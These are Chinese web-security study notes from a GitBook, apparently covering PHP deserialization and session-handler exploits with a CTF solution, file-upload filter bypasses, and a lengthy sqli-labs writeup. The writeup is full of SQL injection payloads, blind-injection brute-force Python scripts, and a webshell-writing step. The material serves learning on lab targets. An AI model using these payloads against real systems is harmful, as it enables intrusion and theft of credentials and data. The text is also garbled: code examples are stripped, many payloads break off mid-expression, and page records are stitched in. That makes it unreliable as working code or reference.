当读取不可访问属性时，__get()会被调用 函数原型： public __get ( string $name ) : mixed __set() 当给不可访问属性赋值时，__set()方法会被调用 函数原型： public __set ( string $name , mixed $value ) : void __isset() 当对不可访问属性调用isset()或empty()时，__isset()会被调用。 函数原型： public __isset ( string $name ) : bool __unset() 当对不可访问属性调用unset()时，__unset()函数会被调用。 函数原型： public __unset ( string $name ) : void PHP反序列化漏洞 开发者在写程序时没有控制好传递给unserialize()函数的变量，导致用户可以控制反序列化的内容，攻击者可以提交特定的序列化字符串给unserialize()函数，可以实现PHP对象注入，最终可能会导致任意代码执行等问题。 例如: var); } } $a = new test(); unserialize($_GET['a']); 类test中有一个__construct()构造函数和一个__destruct()析构函数。构造函数输出一个字符串，析构函数将属性var传给eval执行。 构造代码： 得到序列化字符串： O:4:\"test\":1:{s:3:\"var\";s:10:\"phpinfo();\";} __wakeup()方法绕过 PHP反序列化漏洞CVE-2016-7124 当反序列化字符串时，如果表示属性个数的值大于真实属性个数时，就会绕过__wakeup函数的执行 适用版本： PHP5 PHP7 demo var = $a; } function __wakeup(){ if(!isset($this->var)){ $this->var = 'hello'; }else{ $this->var = 'hello'; } } function __destruct(){ echo \"var is \".$this->var.\"\\n\"; } } $b = unserialize($_GET['a']); 上面的代码__wakeup()会将var初始化为'hello'，但是当传入序列化字符串中的属性个数比实际大时就会绕过__wakeup()方法。 构造序列化字符串： O:4:\"test\":2:{s:3:\"var\";s:3:\"pwn\";} __wakeup()方法就被绕过了，var的值被设为了'pwn'. Session反序列化漏洞 前置知识： 序列化处理器 PHP序列化处理一共有三种：php_serialize、php_binary和php(需要编译时开启支持) 它们三者的存储格式分别为： php_serialize：serialize()函数序列化处理的数组 php_binary：键名的长度对应的ascii字符+键名+经过serialize()序列化处理的值 php：键名 + 竖线+ 经过serialize()函数序列化处理的值 例如： $_SESSION['user'] = $_GET['a']; 假设传进去的字符串为\"admin\"，那么经过三者序列化处理的字符串分别为： php_serialize : a:1{s:4:\"user\";s:5:\"admin\";} php_binary : (4所对应的ascii码)+user:5:\"admin\" php : user|s:5:\"admin\" Session的基本原理 Session是存储在服务端的会话，对比cookie来说，相对安全，而且不像cookie那样有存储长度限制。当浏览器第一次发送请求时，服务器会自动生成一个Session和一个Session ID用来唯一表示这个Session，并且将它通过相应发送给服务器。浏览器第二次发送请求时，会将之前获得的Session ID放在请求中一起发给服务器，然后服务器从请求中提取Session ID，将这个ID和保存的Session ID对比，找到对应的Session。 通常session存储的文件名为sess_ + PHPSESSID。 Session序列化机制 当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。 php.ini配置 php.ini中有一些关于session的配置，我们需要知道的有这几个 session.save_path=\"\" --设置session的存储路径 session.save_handler=\"\"--设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) session.auto_start boolen--指定会话模块是否在请求开始时启动一个会话默认为0不启动 session.serialize_handler string--定义用来序列化/反序列化的处理器名字。默认使用php 漏洞原理 Session反序列化漏洞原理挺简单的，就是处理Session序列化和Session反序列化的引擎不同，利用引擎之间的差异产生了序列化注入漏洞。 例子： session1.php session2.php strings; } } 首先通过访问session1.php写入session，因为session1.php使用的引擎是php_serialize()，所以存储格式为serialize()函数处理的格式，传入一个|会被当作普通字符。但是当访问session2.php时，使用的引擎是php，它会将|当作键名与值得分隔符，从而产生歧义，导致在解析session文件时对|后的值做了反序列化处理。 攻击payload生成: 输出： O:4:\"test\":1:{s:6:\"stings\";s:3:\"pwn\";} 最终payload: |O:4:\"test\":1:{s:6:\"stings\";s:3:\"pwn\";} 访问session1.php，可以发现payload被写入session文件里了 这时访问session2.php，那么php引擎就会将|后的当作序列化字符串进行反序列化，页面上就会输出\"strings is pwn\"。 利用 upload_process 机制 如果不能直接控制SESSION值时，可以通过 upload_process 机制来往$_SESSION中写入值。 当 session.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。 jarvisoj上有道这样的题目：PHPINFO mdzz = 'phpinfo();'; } function __destruct() { eval($this->mdzz); } } if(isset($_GET['phpinfo'])) { $m = new OowoO(); } else { highlight_string(file_get_contents('index.php')); } ?> 可以发现它一开始就通过ini_set设置使用php引擎，当GET传入一个phpinfo变量时，就会new一个OowoO对象，OowoO对象中的__construct()会初始化mdzz属性为\"phpinfo();\"，而它的__destruct()会执行eval($this->mdzz)，将phpinfo信息打印出来。 通过phpinfo的信息可以知道它处理session的引擎不一致 local: php master: php_serialize 其中local指的是当前目录中，它会将master的内容， 而master指的是php.ini设置的session.serialize_handler。所以很明显这里存在session反序列化漏洞。 接下来就是如何往session中写入内容。 通过phpinfo的信息可以发现它session_upload_progress_enabled是开启的，同时session_upload_progress_cleanup是关闭的，这允许我们在一个文件上传的时候，通过POST请求一个与INI中设置的session.upload_progress.name同名变量，来往session中写入内容，并且它的值能被保存下来。 构建一个文件上传的html： 因为它disable_function经用了一堆调用系统命令的函数， 所以只能用php自带函数来读取目录和文件内容 。 构建poc class OowoO{ public $mdzz=\"print_r(scandir(dirname(__FILE__)));\"; } $a = new OowoO(); echo serialize($a); 输出 ： O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";} 最终payload: |O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:36:\\\"print_r(scandir(dirname(__FILE__)));\\\";} 抓包，其中 http报文中的filename的值对应 $_SESSION['upload_progress_laruence']['files'][0]['name'] http报文中的name的值对应 $_SESSION['upload_progress_laruence']['files'][0]['filed_name'] 这两处都可以攻击，这里选择将filename修改为payload 可以返回的文件名中包含有Here_1s_7he_fl4g_buT_You_Cannot_see.php flag就在这个文件里，通过phpinfo可以得到文件的绝对路径，然后就可以利用file_get_content函数读取flag出来。 路径：/opt/lamp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php 替换payload里的print_r(scandir(dirname(__FILE__)));为print_r(file_get_content(\\\"/opt/lamp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\\"))来读取flag payload: |O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:88:\\\"print_r(file_get_contents(\\\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\\"));\\\";} REFERENCE https://xz.aliyun.com/t/7366#toc-3 https://xz.aliyun.com/t/3674#toc-13 https://xz.aliyun.com/t/7570#toc-11 https://websec.readthedocs.io/zh/latest/language/php/unserialize.html Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-05-25 15:50:09 "},"web常见漏洞原理及利用/文件上传漏洞.html":{"url":"web常见漏洞原理及利用/文件上传漏洞.html","title":"文件上传漏洞","keywords":"","body":"文件上传漏洞 漏洞原理 网站WEB应用存在一些文件上传功能，如文档、头像、图片、视频上传等，但是上传文件时，服务端代码对客户端上传的文件没有进行严格的校验和过滤，就可能导致可以上传任意文件。 危害 通过这个漏洞，非法用户可以上传恶意脚本文件（webshell），通过webshell来控制整个网站，可以实现查看服务器目录、文件、执行系统命令等操作。 上传检测流程 客户端 JavaScript检测文件扩展名 服务端 服务端MIME类型检测（检测Content-Type内容） 服务端目录路径检测（检测Path参数相关的内容） 服务端文件扩展名检测 服务端文件内容检测（检测文件头或者是否包含恶意代码） 绕过方法 JS检测绕过 客户端浏览器使用JS对客户上传的文件后缀名进行检测，如果不符和条件就会弹框警告。 function checkUpload(fileobj){ var fileArr = fileobj.value.split(\".\"); //对文件名进行处理 var ext = fileArr[fileArr.length-1]; //得到文件扩展名 if(ext!='gif') //验证扩展名 { alert(\"Only upload GIF images.\"); fileobj.value = \"\"; //清除数据 } } 这个很容易绕过，大致有两种方法。 一是直接禁用掉浏览器的JS，这个方法比较粗暴，不推荐使用，禁用JS的话可以用火狐的一个叫NoScript的插件。 另一种方法是将要上传的文件后缀改为允许上传的后缀，绕过JS检测，再抓包，将后缀名修改为可执行脚本的后缀名。 文件类型绕过 如果服务端是通过Content-Type来判断文件类型的话，只要抓包修改它的值为允许的值就可以绕过了 服务端文件扩展名绕过 服务端文件扩展名检测有两种检测方法： 黑名单检测 黑名单检测会检测上传的文件是否是包含在blacklist里的危险类型，如： $file_name = $_FILES['fupload']['name']; // 文件名 $file_ext = substr($file_name, strrpos($file_name,'.') + 1); //文件后缀 $file_tmp = $_FILES['fupload']['tmp_name']; //临时文件 $target_path = \"uploads/\".md5(uniqid(rand())).\".\".$file_ext; //存储路径与名称 // 检测后缀名 $black_ext = explode(\"|\", \"asp|asa|cer|cdx|aspx|ashx|ascx|asax|php|php2|php3|php4|php5|asis|htaccess|htm|html|shtml|pwml|phtml|phtm|js|jsp|vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini\"); // 转换为数组 if(in_array($file_ext,$black_ext)) { exit(\"Only upload GIF images.\"); } 白名单检测 白名单检测会只允许用户上传指定类型的文件，如：jpg/png/gif等 黑名单检测绕过 后缀名大小写绕过 服务端没有将后缀名转化成统一的格式进行比较，导致可以上传成功后缀为PhP等类型的文件，同时windows操作系统对大小写不敏感，所以.PhP会被当做.php文件解析。这个在Linux下就不好使了。 重写绕过 服务端将黑名单的后缀名都替换为空，但是它只进行一次。那么上传后缀名为.pphphp的文件，替换php一次为空，文件的后缀名就为.php 特殊可解析绕过 服务端的黑名单不严谨，在某些特定的环境某些特殊的后缀名也会被当成php文件解析。 php|php2|php3|php4|php5|php6|php7|phtml|phtm|pht 基于debain和ubuntu的apt-get安装的apache2，默认对文件解析规则如下： .htaccess绕过 在apache中，.htaccess是一个配置文件，可以用来控制文件目录的访问权限以及解析设置。可以通过这个文件将该目录下的所有文件当作php来解析。 配置上要允许.htaccess生效 Apache开启rewrite模块 Apache配置文件为AllowOverride All(默认为None) 配置文件的两种写法 AddType application/x-httpd-php .jpgor SetHandler application/x-httpd-php 通过上传这样一个.htaccess文件，就可以将目录下的jpg当作php来解析了。 利用操作系统特性-windows windows对文件和文件名存在限制，上传不符合windows文件命名规则的文件名，在最后生成文件时，字符会被自动去除 shell.php.shell.php......shell.php_shell.php(空格)shell.php[%81-%99] windows文件流绕过 shell.php::$DATA shell.php::$DATA...... 白名单检测绕过 白名单检测一般比较难绕过，通常是比较难绕过的，一般是结合解析漏洞、服务端代码漏洞（造成%00截断的相关函数）、以及相关的操作系统特性来绕过。 %00截断 这个对php的版本有要求， php 版本 在文件上传中，利用%00截断，在文件扩展名验证时，是去文件的扩展名来验证，但是最后文件保存到本地时，%00会截断文件名，只保存%00之前的内容。 具体做法，上传一个shell.php的文件，抓包将文件名修改为shell.php%00.jpg，上传成功。 操作系统特性 文件名使用非字母数字，比如中文等最大程度的拉长，不同的操作系统文件名最大长度不同，可以测试出来。 windows windows10文件名长度最大为223包括后缀，win2012的为237 Linux linux ubuntu.16.04.1文件名长度最大252 服务端文件内容检测绕过 文件头检测 服务端只检测了文件头，png|jpg|gif文件头如下： PNG：8950 4E 47 JPG：FFD8 FF E0 00 10 4A 46 49 46 GIF：4749 46 38 39 61 只要在一句话木马前加上文件头就可以绕过了 getimagesize()函数绕过 服务端使用getimagesize()函数来检测文件类型，这个函数通过检查文件头来判断文件类型，所以绕过方法和上面一样，也是加对应的文件头就可以了 exif_imagetype() exif_imagetype()函数通过读取文件的第一个字节来判断文件类型，绕过方法同上 图片二次渲染 服务端对图片进行了二次渲染，将原本属于图片数据的部分提取出来，再用自己的API或者函数进行渲染，通常php使用的是GD库，这个一般比较难绕过。 基本绕过方法是基本方法是通过对比处理前和处理后的图片数据，找出没未经处理的数据区域，然后将代码插入。 GIF可以使用基本方法去做，但是jpg和png就比较难。 jpg和png的制作方法参考: https://xz.aliyun.com/t/2657 条件竞争绕过 一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传文件是否包含webshell，如果包含则删除该文件。这里存在条件竞争，文件上传成功后和删除文件之间存在时间差，利用这个时间差可以生成一个新的webshell 解析漏洞 解析漏洞是指服务器对http请求处理不当导致将非可执行的文件当作可执行的脚本来执行，一般配合文件上传功能使用。 IIS IIS6.0 目录解析 在网站下建立的文件夹的名称中带有.asp、.asa等可执行脚本文件后缀的文件夹，其目录下的任何扩展名文件都会被IIS当作可执行脚本来解析并执行。 www.demo.com/shell.asp/shell.jpg 文件解析 服务器默认不解析;后的内容，所以shell.asp;.jpg会被识别为asp文件 shell.asp;.jpg 文件类型解析 IIS6.0默认可执行文件除了.asp，还包括 .asa .cdx .cer ，这三种类型都可以被解析执行。 IIS7.0/IIS7.5 漏洞出现自php-cgi，与Nginx的解析漏洞类似。对任意文件名只要在URL后面追加字符串/任意文件名.php就会被当成php文件去解析。 shell.jpg/x.php Apache Apache解析文件的规则是从右到左的开始判断的，如果后缀名为不可识别文件，就往左判断. shell.php.xxx.aaa.bbb 这个文件会被解析成php 漏洞存在的Apache版本: Apache2.0.x Nginx Nginx默认是以CGI的方式支持php解析的，通常的做法是在Nginx的配置文件中通过正则设置 SCRIPT_FILENAME 。当访问www.demo.com/shell.jpg/x.php时，$fastcgi_scipt_name会被设置为”shell.jpg/x.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI。如果开启了fix_pathinfo这个选项，那么PHP会认为SCRIPT_FILENAME是shell.jpg，而x.php 是PATH_INFO，所以shell.jpg会被当成php来解析。 REFERENCE https://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/ https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/ https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/ https://www.freebuf.com/articles/web/179954.html http://byd.dropsec.xyz/2017/02/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%BB%95%E8%BF%87/ Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-06-22 17:04:39 "},"CTFwriteup/":{"url":"CTFwriteup/","title":"CTFwriteup","keywords":"","body":"CTFwriteup 这一部分是我做的CTF练习的writeup Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-05-25 15:53:49 "},"CTFwriteup/sqli-labs-writeup.html":{"url":"CTFwriteup/sqli-labs-writeup.html","title":"sqli-labs-writeup","keywords":"","body":"sqli-labs writeup 刷刷sqli-labs ，学习下sql注入漏洞 环境是win10虚拟机, phpstudy搭建的 php版本:5.4.45 mysql版本:5.7.26 Basic injections less-1 单引号闭合 payload: 获取表名 ?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 获取列名 ?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+ 获取字段内容 ?id=0' union select 1,2,group_concat(0x3a,username,0x3a,password) from users --+ less-2 数字型注入,直接用union注入就可以了 payload: 获取表名 ?id=0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() 获取列名 ?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' 获取字段内容 ?id=0 union select 1,2,group_concat(0x3a,username,0x3a,password) from users less-3 单引号加圆括号闭合 payload： 注入点探测： ?id=1') and 1=2 --+ 获取列数量： ?id=1') order by 4 --+ 获取表名： ?id=0') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 获取列名： ?id=0') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+ 获取数据： ?id=0') union select 1,2,group_concat(0x3a,username,0x3a,password) from users --+ less-4 字符型注入，双引号加圆括号闭合 payload： 获取表名 ?id=0\") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() --+ 获取列名 ?id=0\") union select 1,2,group_concat(column_name) from information_schema.columns where table_name = \"users\" --+ 获取字段内容 ?id=0\") union select 1,2,group_concat(username,0x31,password) from users --+ less-5 布尔盲注，需要注意闭合单引号 数据库名长度判断 payload : ?id=0' or length(database())>7 --+ 脚本： import requests def brute_len(url,payload): len = 0 for i in range(0,10000): param = {\"id\":payload.format(str(i))} r = requests.get(url,param) if(\"You are in...........\" not in r.text): print(\"len : \"+ str(i)) len = i break else: continue return len url = \"http://192.168.31.41/sqli/Less-5/\" payload = \"0\\' or length(database()) > {0} #\" brute_len(url,payload) 爆破数据库名 这里用了两种方法，一种是遍历法，一种是二分法 遍历法 import requests char_list = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&()*+,-./:;?@[]^_{|}~\" def bruteforce(url, payload, len): out = '' for i in range(1, len + 1): for c in char_list: id = payload.format(str(i), c) params = {\"id\": id} r = requests.get(url, params) if (\"You are in...........\" in r.text): out += c print(c, end=\"\") break else: continue return out url = \"http://192.168.31.41/sqli/Less-5/\" payload = \"0\\' or substr(database(),{0},1) = '{1}' #\" namelen = 8 print(\"database name is: \", end=\"\") database = bruteforce(url, payload, namelen) 二分法 import requests def binary(url, payload, len): out = '' for i in range(1, len + 1): left = 0x1f right = 0x7f while 1: mid = left + (right - left)// 2 if (mid == left): print(chr(mid), end=\"\") out += chr(mid) break s = payload.format(str(i), mid) params = {\"id\": s} r = requests.get(url, params) if (\"You are in..........\" in r.text): right = mid else: left = mid url = \"http://192.168.31.41/sqli/Less-5/\" payload = \"0\\' or ascii(substr(database(),{0},1)) 获取表名长度 脚本还是用之前爆破长度的脚本，这里只记录下payload payload2 = \"0\\' or length((select group_concat(table_name,0x3a) from information_schema.tables where table_schema =database()))> {0} #\" brute_len(url,payload2) 获取表名 获取表名用的脚本是上面写的二分法和遍历法，两种都行，这里只记录payload，后面爆破列名和字段内容都一样，也只记录payload payload3 = \"0\\' or ascii(substr((select group_concat(table_name,0x3a) from information_schema.tables where table_schema=database()),{0},1)) 获取列名长度 payload4 = \"0\\' or length((select group_concat(column_name,0x3a) from information_schema.columns where table_name='users')) > {0} #\" brute_len(url,payload4) 获取列名 payload5 = \"0\\' or ascii(substr((select group_concat(column_name,0x3a) from information_schema.columns where table_name='users'),{0},1)) 获取字段内容长度 payload6 = \"0\\' or length((select group_concat(username,0x3a,password) from users)) > {0} #\" brute_len(url,payload6) 获取字段内容 payload7 = \"0\\' or ascii(substr((select group_concat(username,0x3a,password) from users),{0},1)) less-6 这一关我用了两种做法，一个是布尔盲注，另一个是基于xpath语法的报错注入 基于xpath语法的报错注入 payload: #获取数据库名 ?id=1\" union select updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ #获取表名 ?id=1\" union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() ),0x7e),1)--+ #获取列名 ?id=1\" union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"users\" ),0x7e),1)--+ #获取字段内容 ,这里使用limit选择读取的内容，因为报错显示的消息长度有限 ?id=1\" union select updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 1,1),0x7e),1)--+ 基于布尔盲注的注入 import requests def brute_len(url,payload): len = 0 for i in range(1,100000): param = {\"id\":payload.format(str(i))} r = requests.get(url,param) if(\"You are in...........\" not in r.text): print(\"len : \" + str(i)) len = i break else: continue return len def binary(url, payload, len): out = '' for i in range(1, len + 1): left = 0x1f right = 0x7f while 1: mid = left + (right - left)// 2 if (mid == left): print(chr(mid), end=\"\") out += chr(mid) break s = payload.format(str(i), mid) params = {\"id\": s} r = requests.get(url, params) if (\"You are in..........\" in r.text): right = mid else: left = mid def get_payload(flag): if flag == \"database_len\": return \"0\\\" or length(database())>{0} #\" elif flag == \"database_name\": return \"0\\\" or ascii(substr(database(),{0},1)) {0} #\" elif flag == \"table_name\": return \"0\\\" or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)) {0} #\" elif flag == \"column_name\": return \"0\\\" or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),{0},1)) {0} #\" elif flag == \"field_data\": return \"0\\\" or ascii(substr((select group_concat(username,0x3a,password) from users),{0},1)) less-7 这关是要闭合单引号加上两个圆括号，这一关提示是dump into outfile 所以可以利用into outfile函数将webshell写入服务器中，不过要知道写入文件的绝对路径，这就有点难了 我是用phpstduy在windows搭的环境 所以路径为： \"c:\\phpstudy_pro\\www\" 在写入webshell后通过蚁剑进行连接 这题还可以有另一种做法，就是布尔盲注，它页面的信息可以判断true或者false dump into file做法 ?id=1')) union select '\\' into outfile \\\"c:\\\\phpstudy_pro\\\\www\\\\test.php\\\" --+ 通过蚁剑连接webshell 布尔盲注的做法和less-6一样，就不写了 less-8 布尔盲注，需要闭合单引号 这一题拿less-6的脚本，将payload改一下就能用 payload url = \"http://192.168.31.41/sqli/Less-8\" payload = \"0\\' or length(database()) > {0} #\" database_len = brute_len(url,payload) payload1 = \"0\\' or ascii(substr(database(),{0},1)) {0} #\" table_len = brute_len(url,payload2) payload3 = \"0\\' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)) {0} #\" column_len = brute_len(url,payload4) payload5 = \"0\\' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\\'users\\'),{0},1)) {0} #\" field_len = brute_len(url,payload6) payload7 = \"0\\' or ascii(substr((select group_concat(username,0x3a,password) from users),{0},1)) less-9 时间盲注，需要闭合单引号 时间盲注的做法和布尔盲注的类似，不过用于判断sql语句是否执行是通过请求页面的响应时间来判断，而布尔盲注是通过页面显示的ture或者false来判断。 时间盲注用到了sleep()函数，这个函数用于执行延时操作 基本payload如下： ?id=1' and if(len(databse()) > 2, 0 , sleep(4)) # 这里的if语句如果条件为false，就会执行sleep(4)，然后通过判断页面的响应时间就可以知道if语句为真还是假 这里判断页面延时可以通过burpsutie来发送请求 脚本的编写和盲注的也类似，这里就不爆破长度了，没有必要，浪费时间，直接爆破字段值 exp： import requests def traverse(url,payload): out='' char_list = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&()*+,-./:;?@[]^_{|}~\" for i in range(1,1000000): for c in char_list: id = payload.format(str(i),c) param = {\"id\": id} try: r = requests.get(url, param, timeout=3) if r.text != \"\": continue except: print(c,end=\"\") out += c break return out url = \"http://192.168.31.41/sqli/Less-9\" #brute database name payload1 = \"1\\' and if((substr(database(),{0},1)= \\\"{1}\\\"),sleep(5),0) #\" #brute table name payload2 = \"1\\' and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)=\\\"{1}\\\"),sleep(3),0) #\" #brute column name payload3 = \"1\\' and if((substr((select group_concat(column_name) from information_schema.columns where table_name='users'),{0},1)=\\\"{1}\\\"),sleep(3),0) #\" #brute field data payload4 = \"1\\' and if((substr((select group_concat(username,0x3a,password) from users),{0},1)=\\\"{1}\\\"),sleep(3),0) #\" traverse(url,payload1) less-10 还是时间盲注，和less-9类似，不过这一关是要闭合双引号 还有判断响应时间最好还是用burpsuite来看 payload： payload1= \"1\\\" and if((substr(database(),{0},1)= \\\"{1}\\\"),sleep(5),0) #\" payload2= \"1\\\" and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)=\\\"{1}\\\"),sleep(3),0) #\" payload3= \"1\\\" and if((substr((select group_concat(column_name) from information_schema.columns where table_name='users'),{0},1)=\\\"{1}\\\"),sleep(3),0) #\" payload4 = \"1\\\" and if((substr((select group_concat(username,0x3a,password) from users),{0},1)=\\\"{1}\\\"),sleep(3),0) #\" less-11 这一关是基于POST的注入，有报错信息回显，要闭合单引号 判断注入点： uname=admin'&passwd=test&submit=Submit payload: (POST数据) #get database name uname=admin&passwd=test' union select 1,database()#&submit=Submit #get table name uname=admin&passwd=test' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&submit=Submit #get column name uname=admin&passwd=test' union select 1,group_concat(column_name) from information_schema.columns where table_name=\"users\"#&submit=Submit #get field data uname=admin&passwd=test' union select 1,group_concat(username,0x3a,password) from users#&submit=Submit less-12 基于POST的注入，有报错信息回显，要闭合双引号加一个圆括号 判断注入点： uname=admin\"&passwd=test&submit=Submit payload: #get database name uname=admin&passwd=test\") union select 1,database()#&submit=Submit #get table name uname=admin&passwd=test\") union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&submit=Submit #get column name uname=admin&passwd=test\") union select 1,group_concat(column_name) from information_schema.columns where table_name=\"users\"#&submit=Submit #get field data uname=admin&passwd=test\") union select 1,group_concat(username,0x3a,password) from users#&submit=Submit less-13 基于POST的布尔盲注，通过图片判断是否登录成功 判断注入点： uname=admin' 根据报错信息还需要闭合一个圆括号 exp: import requests def binary_brute(url,payload): for i in range(1,10000): left = 0x1f right= 0x7f while 1: mid = left + (right - left)//2 if(mid == left): print(chr(mid),end=\"\") break uname = payload.format(str(i),str(mid)) param = {\"uname\":uname,\"passwd\":\"123\",\"submit\":\"Submit\"} r=requests.post(url,param) if(\"flag.jpg\" in r.text): right = mid else: left = mid url = \"http://192.168.31.41/sqli/Less-13/\" #brute database name # payload1 = \"test') or ascii(substr(database(),{0},1)) less-14 这题和13关类似，都是可以用基于布尔的盲注来做，它需要闭合双引号 注入点探测： uname=admin\" payload: #brute database name payload1 = \"test\\\" or ascii(substr(database(),{0},1)) less-15 这一关没有报错信息，只能知道是否登录成功，所以可以通过布尔盲注来做。当然，通过时间盲注也是可以的 注入点探测： uname=admin' uname=admin'# 布尔盲注的exp: import requests def binary_brute(url,payload): for i in range(1,10000): left = 0x1f right= 0x7f while 1: mid = left + (right - left)//2 if(mid == left): print(chr(mid),end=\"\") break uname = payload.format(str(i),str(mid)) param = {\"uname\":uname,\"passwd\":\"123\",\"submit\":\"Submit\"} r=requests.post(url,param) if(\"flag.jpg\" in r.text): right = mid else: left = mid url = \"http://192.168.31.41/sqli/Less-15/\" #brute database name # payload1 = \"test' or ascii(substr(database(),{0},1)) 时间盲注的exp: import requests def traverse(url,payload): for i in range(1,1000): for c in range(0x1f,0x80): uname = payload.format(str(i),str(c)) #print(uname) params = {\"uname\":uname,\"passwd\":\"123\",\"submit\":\"Submit\"} try: r = requests.post(url,params,timeout=2) if(r.text != \"\"): continue except: print(chr(c),end=\"\") break url = \"http://192.168.31.41/sqli/Less-15/\" #brute database name # payload1 = \"test' or if((ascii(substr(database(),{0},1))={1}),sleep(2),1) #\" # traverse(url,payload1) #brute table name # payload2 = \"test' or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))={1}),sleep(2),1) #\" # traverse(url,payload2) #brute column name # payload3 = \"test' or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\\\"users\\\"),{0},1))={1}),sleep(2),1) #\" # traverse(url,payload3) #brute field data payload4 = \"test' or if((ascii(substr((select group_concat(username,0x3a,password) from users),{0},1))={1}),sleep(2),0) #\" traverse(url,payload4) less-16 这一关和less-15关类似，同样可以通过布尔盲注或者时间盲注来做，它要闭合双引号加一个圆括号 注入点探测： uname=admin\"#&passwd=&submit=Submit uname=admin\")#&passwd=&submit=Submit uname=admin\")#&passwd=&submit=Submit 脚本就用less-15的，下面贴下payload 布尔盲注payload: #brute database name # payload1 = \"test\\\") or ascii(substr(database(),{0},1)) 时间盲注的payload: #brute database name # payload1 = \"test\\\") or if((ascii(substr(database(),{0},1))={1}),sleep(2),1) #\" # traverse(url,payload1) #brute table name # payload2 = \"test\\\") or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))={1}),sleep(2),1) #\" # traverse(url,payload2) #brute column name # payload3 = \"test\\\") or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\\\"users\\\"),{0},1))={1}),sleep(2),1) #\" # traverse(url,payload3) #brute field data payload4 = \"test\\\") or if((ascii(substr((select group_concat(username,0x3a,password) from users),{0},1))={1}),sleep(2),0) #\" traverse(url,payload4) less-17 这一关是针对update语句的注入，有报错信息回显，所以可以进行报错注入 一般update语句如下: update users set password='$p' where username='admin' 注入点探测： uname=admin&passwd=1' &submit=Submit uname=admin&passwd=1' #&submit=Submit payload： #get databsae name uname=admin&passwd=1' or updatexml(1,concat(0x7e,(select database()),0x7e),1) # #get table name uname=admin&uname=admin&uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) # #get column name uname=admin&uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where uname=admin&uname=admin&table_name=\"users\"),0x7e),1) # #get field data uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select * from ((select group_concat(username,0x3a,password) from security.users limit 0,1)) as a),0x7e),1) # 这里获取users表的数据时要将结果再通过一个中间表多select的形式，不然会出现下面这个错误 You can’t specify target table for update in FROM clause 这个错误的意思是不能在同一个SQL语句中，先select某些表中的语句值然后再update它。所以这select不能直接获取users表的内容，而是通过中间表再来select一次，这里要注意给中间表一个别名，不然会报错 这里再记录一下使用extractvalue函数的报错注入 payload: #get database name uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) # #get table name uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) # #get column name 